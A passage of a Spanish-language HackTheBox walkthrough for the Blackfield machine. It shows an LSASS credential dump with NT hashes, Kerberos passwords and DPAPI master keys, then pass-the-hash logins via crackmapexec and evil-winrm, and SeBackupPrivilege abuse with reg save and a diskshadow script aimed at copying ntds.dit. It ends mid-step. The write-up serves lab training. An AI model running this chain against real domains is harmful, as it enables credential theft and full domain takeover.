		sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 137110 <span class="o">(</span>21796<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.068590+00:00
sid S-1-5-18
luid 137110
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 134695 <span class="o">(</span>20e27<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.678019+00:00
sid S-1-5-18
luid 134695
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 40310 <span class="o">(</span>9d76<span class="o">)</span>
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40310
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>9d76]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [9d76]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 40232 (9d28)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40232
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [9d28]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	<span class="o">==</span> WDIGEST <span class="o">[</span>9d28]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 996 <span class="o">(</span>3e4<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:46.725846+00:00
sid S-1-5-20
luid 996
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>3e4]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: dc01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [3e4]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24410 (5f5a)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-1
luid 24410
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [5f5a]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	<span class="o">==</span> WDIGEST <span class="o">[</span>5f5a]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 406499 <span class="o">(</span>633e3<span class="o">)</span>
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
	<span class="o">==</span> WDIGEST <span class="o">[</span>633e3]<span class="o">==</span>
		username svc_backup
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
	<span class="o">==</span> WDIGEST <span class="o">[</span>633e3]<span class="o">==</span>
		username svc_backup
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> DPAPI <span class="o">[</span>633e3]<span class="o">==</span>
		luid 406499
		key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
		masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
		sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 366665 <span class="o">(</span>59849<span class="o">)</span>
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366665
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>59849]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [59849]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 366649 (59839)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366649
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [59839]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	<span class="o">==</span> WDIGEST <span class="o">[</span>59839]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 256940 <span class="o">(</span>3ebac<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.068835+00:00
sid S-1-5-18
luid 256940
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 136764 <span class="o">(</span>2163c<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.052945+00:00
sid S-1-5-18
luid 136764
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 134935 <span class="o">(</span>20f17<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.834285+00:00
sid S-1-5-18
luid 134935
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 997 <span class="o">(</span>3e5<span class="o">)</span>
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server
logon_time 2020-02-23T17:57:47.162285+00:00
sid S-1-5-19
luid 997
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username:
		Domain:

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 24405 <span class="o">(</span>5f55<span class="o">)</span>
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-0
luid 24405
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>5f55]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5f55]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24294 (5ee6)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-0
luid 24294
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [5ee6]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	<span class="o">==</span> WDIGEST <span class="o">[</span>5ee6]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 24282 <span class="o">(</span>5eda<span class="o">)</span>
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-1
luid 24282
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>5eda]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5eda]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 22028 (560c)
session_id 0
username
domainname
logon_server
logon_time 2020-02-23T17:57:44.959593+00:00
sid None
luid 22028
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:44.913221+00:00
sid S-1-5-18
luid 999
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: dc01$
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [3e7]==
		luid 999
		key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
		masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
		sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
	== DPAPI [3e7]==
		luid 999
		key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
		masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
		sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
	== DPAPI [3e7]==
		luid 999
		key_guid 31632c55-7a7c-4c51-9065-65469950e94e
		masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
		sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
	== DPAPI [3e7]==
		luid 999
		key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
		masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
		sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed
</span></code></pre></div></div>

<ul>
  <li>Este usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> y tenemos sus <code class="language-plaintext highlighter-rouge">hash</code> NT.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">==</span> MSV <span class="o">==</span>
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
</code></pre></div></div>

<ul>
  <li>Vamos a validar que el hash sea correcto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.23.192 <span class="nt">-u</span> <span class="s1">'svc_backup'</span> <span class="nt">-H</span> <span class="s1">'9658d1d1dcd9250115e2205d9f48400d'</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>vc_backup:9658d1d1dcd9250115e2205d9f48400d
</code></pre></div></div>

<ul>
  <li>Y vemos que si forma parte del grupo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.23.192 <span class="nt">-u</span> <span class="s1">'svc_backup'</span> <span class="nt">-H</span> <span class="s1">'9658d1d1dcd9250115e2205d9f48400d'</span>
SMB         10.129.23.192   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span>
HTTP        10.129.23.192   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.23.192:5985/wsman
WINRM       10.129.23.192   5985   DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>vc_backup:9658d1d1dcd9250115e2205d9f48400d <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ya podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'svc_backup'</span> <span class="nt">-H</span> <span class="s1">'9658d1d1dcd9250115e2205d9f48400d'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>blackfield<span class="se">\s</span>vc_backup
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la <strong>flag</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
3920bb317a0bef51027e2852be64b543
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Tenemos el privilegio <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/5.png" />
</p>

<ul>
  <li>
    <p>Vamos a crear un directorio <code class="language-plaintext highlighter-rouge">Temp</code> para desde allí hacer todo.</p>
  </li>
  <li>
    <p>Vamos a dumpear el <code class="language-plaintext highlighter-rouge">ntds</code> pero de primeras no podemos hacer la copia por que no tenemos los suficientes privilegios.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; copy C:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.nit
Access to the path <span class="s1">'C:\Windows\NTDS\ntds.dit'</span> is denied.
At line:1 char:1
+ copy C:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.nit
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: <span class="o">(</span>C:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit:FileInfo<span class="o">)</span> <span class="o">[</span>Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
</code></pre></div></div>

<ul>
  <li>Pero si queremos ver el hash primero necesitamos una copia de system para usar <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; reg save HKLM<span class="se">\s</span>ystem system
</code></pre></div></div>

<ul>
  <li>Podemos seguir los pasos como no lo dicen aquí <a href="https://pentestlab.blog/tag/diskshadow/">https://pentestlab.blog/tag/diskshadow/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>zi.txt
<span class="nb">set </span>context persistent nowriters
add volume c: <span class="nb">alias </span>miguelito
create
expose %miguelito% z:
</code></pre></div></div>

<ul>
  <li>Ahora vamos a subirlo a la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; upload zi.txt
</code></pre></div></div>

<ul>
  <li>Pero no funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; diskshadow.exe /s c:<span class="se">\T</span>emp<span class="se">\z</span>i.txt
Microsoft DiskShadow version 1.0
Copyright <span class="o">(</span>C<span class="o">)</span> 2013 Microsoft Corporation
On computer:  DC01,  4/20/2024 7:01:46 PM

-&gt; <span class="nb">set </span>context persistent nowriter

